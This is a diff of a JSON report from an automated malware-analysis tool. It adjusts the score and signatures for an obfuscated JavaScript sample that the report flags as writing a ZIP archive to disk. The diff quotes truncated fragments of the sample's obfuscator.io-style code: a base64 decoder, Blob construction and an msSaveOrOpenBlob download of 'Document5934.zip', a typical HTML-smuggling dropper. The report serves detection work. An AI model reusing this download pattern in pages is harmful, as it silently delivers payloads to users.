@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1553,
+    "score": 1042,
     "sections": [
       {
         "auto_collapse": false,
@@ -38,7 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tfunction a0_0x2869(){var _0x4753e9=['BV0g7f6sAT+ykGFx','13vPdHppxID1ewmj','CQADwSAaY8EgGmN1','Docume...\n\t\ta0_0x2869=function(){return _0x4753e9\n\t\treturn a0_0x2869()\n\t\t}var a0_0x14b753=a0_0x5a06\n\t\t(function(_0x5dcd7f,_0x35b146){var _0x1c3d50=a0_0x5a06,_0x407054=_0x5dcd7f()\n\t\twhile(!![]){try{var _0x66286=parseInt(_0x1c3d50(0x154))/0x1*(parseInt(_0x1c3d50(0x169))/0x2)+-parseI...\n\t\tif(_0x66286===_0x35b146)break\n\t\telse _0x407054['push'](_0x407054['shift']())\n\t\t}catch(_0x13e47f){_0x407054['push'](_0x407054['shift']())\n\t\t}}}(a0_0x2869,0x6e580))\n\t\tfunction a0_0x5a06(_0xe1261,_0x3dbb99){var _0x28696e=a0_0x2869()\n\t\treturn a0_0x5a06=function(_0x5a0673,_0x1027db){_0x5a0673=_0x5a0673-0x126\n\t\tvar _0x1c7535=_0x28696e[_0x5a0673]\n\t\treturn _0x1c7535\n\t\t},a0_0x5a06(_0xe1261,_0x3dbb99)\n\t\t}var text='UEsDBAoAAAAAAKOI'+a0_0x14b753(0x16b)+a0_0x14b753(0x14d)+a0_0x14b753(0x128)+'eAsAAQQAAAAAB...\n\t\tfunction b64toBlob(_0x31a2b8,_0x3262af,_0x49150f){var _0x1f7950=a0_0x14b753,_0xedd820=atob(_0x31a2b8...\n\t\tfor(var _0x12a34f=0x0\n\t\t_0x12a34f<_0xedd820[_0x1f7950(0x132)]\n\t\t_0x12a34f+=_0x49150f){var _0x3d4c2e=_0xedd820[_0x1f7950(0x186)](_0x12a34f,_0x12a34f+_0x49150f),_0x56...\n\t\tfor(var _0x81ddcc=0x0\n\t\t_0x81ddcc<_0x3d4c2e[_0x1f7950(0x132)]\n\t\t_0x81ddcc++){_0x566865[_0x81ddcc]=_0x3d4c2e['charCodeAt'](_0x81ddcc)\n\t\t}var _0x5b3a28=new Uint8Array(_0x566865)\n\t\t_0x492071[_0x1f7950(0x148)](_0x5b3a28)\n\t\t}var _0x3a5870=new Blob(_0x492071,{'type':_0x3262af})\n\t\treturn _0x3a5870\n\t\tif(window[a0_0x14b753(0x139)][a0_0x14b753(0x16a)])window['navigator'][a0_0x14b753(0x16a)](blob,'Docu...\n\t\telse{var url=URL[a0_0x14b753(0x177)](blob),a=document[a0_0x14b753(0x181)]('a')\n\t\ta[a0_0x14b753(0x15a)]=url,a['download']=a0_0x14b753(0x129),document['body'][a0_0x14b753(0x174)](a),a...\n\t\tdocument[_0x493588(0x149)]['removeChild'](a),window['URL'][_0x493588(0x171)](url)",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\tfunction a0_0x2869(){var _0x4753e9=['BV0g7f6sAT+ykGFx','13vPdHppxID1ewmj','CQADwSAaY8EgGmN1','Docume...\n\t\ta0_0x2869=function(){return _0x4753e9\n\t\treturn a0_0x2869()\n\t\t}var a0_0x14b753=a0_0x5a06\n\t\t(function(_0x5dcd7f,_0x35b146){var _0x1c3d50=a0_0x5a06,_0x407054=_0x5dcd7f()\n\t\twhile(!![]){try{var _0x66286=parseInt(_0x1c3d50(0x154))/0x1*(parseInt(_0x1c3d50(0x169))/0x2)+-parseI...\n\t\tif(_0x66286===_0x35b146)break\n\t\telse _0x407054['push'](_0x407054['shift']())\n\t\t}catch(_0x13e47f){_0x407054['push'](_0x407054['shift']())\n\t\t}}}(a0_0x2869,0x6e580))\n\t\t[21 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -86,7 +86,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a Blob object\n\t\tnew Blob(80,75,3,4,10,0,0,0,0,0,163,136,40,85,0,0,0,0,0,0,0,0,0,0,0,0,4,0,28,0,100,111,99,47,85,84,9...\n\t\t}var _0x3a5870=new Blob(_0x492071,{'type':_0x3262af})",
+        "body": "JavaScript creates a Blob object\n\t\t}var _0x3a5870=new Blob(_0x492071,{'type':_0x3262af})",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -134,95 +134,6 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript writes data to disk\n\t\tmsSaveOrOpenBlob([object Blob], Document5934.zip)",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "save_to_file": 10
-          },
-          "signatures": {
-            "save_to_file": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: SaveToFile",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "JavaScript writes archive file to disk\n\t\tmsSaveOrOpenBlob([object Blob], Document5934.zip)",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 500,
-          "score_map": {
-            "writes_archive": 500
-          },
-          "signatures": {
-            "writes_archive": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: WritesArchive",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": null,
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "IOCs extracted by Box.js",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "URL_Blob_file_0",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": null,
-        "promote_to": null,
-        "tags": {
-          "dynamic": {
-            "process": {
-              "file_name": [
-                "URL_Blob_file_0"
-              ]
-            }
-          }
-        },
-        "title_text": "The script wrote the following files",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
         "body": "\t\tObfuscated code was found that was obfuscated by: obfuscator.io",
         "body_config": {},
         "body_format": "TEXT",
@@ -266,27 +177,14 @@
   "files": {
     "extracted": [
       {
-        "name": "Document5934.zip",
-        "sha256": "05b8f8346baf3d7f50bc4315cd3d66e716916e716cc5ef3d3942dd7c2b71e933"
-      },
-      {
         "name": "fdb599ee616fa643820cfaeb9afe561fe5915447ccc80f7d63d85573f0440237.cleaned",
         "sha256": "153b3e0785599c169f576625125bd4a21f19eb140744241ca5e4998becff3ed0"
-      },
-      {
-        "name": "dc7a6e43134675e424d383d96caa04a04e20e1501fbaefb97cfb8580602eeccc",
-        "sha256": "dc7a6e43134675e424d383d96caa04a04e20e1501fbaefb97cfb8580602eeccc"
       }
     ],
     "supplementary": []
   },
   "results": {
     "heuristics": [
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
       {
         "attack_ids": [],
         "heur_id": 2,
@@ -322,20 +220,6 @@
       },
       {
         "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "save_to_file"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
-          "writes_archive"
-        ]
-      },
-      {
-        "attack_ids": [],
         "heur_id": 8,
         "signatures": []
       },
@@ -345,15 +229,7 @@
         "signatures": []
       }
     ],
-    "tags": {
-      "dynamic.process.file_name": [
-        {
-          "heur_id": null,
-          "signatures": [],
-          "value": "URL_Blob_file_0"
-        }
-      ]
-    },
+    "tags": {},
     "temp_submission_data": {
       "cleaned_by_synchrony": true
     }
